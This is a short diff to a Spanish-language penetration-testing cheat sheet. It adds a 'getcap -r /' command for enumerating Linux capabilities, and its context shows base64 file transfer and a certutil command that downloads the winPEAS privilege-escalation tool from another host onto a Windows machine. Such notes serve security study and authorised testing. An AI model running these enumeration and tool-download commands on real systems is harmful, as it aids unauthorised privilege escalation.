@@ -96,6 +96,12 @@ base64 archivo.txt
 base64 -d archivo_codificado.txt > archivo_recibido.txt
 ```
 
+## Ver capacidades/capabilities/división de privilegios
+
+```
+getcap -r /
+```
+
 ## Compartir ficheros con máquinas Windows:
 ```
 certutil -urlcache -split -f http://192.168.200.3/winPEASx64.exe C:\Users\hacker\Documents\winpeas.exe
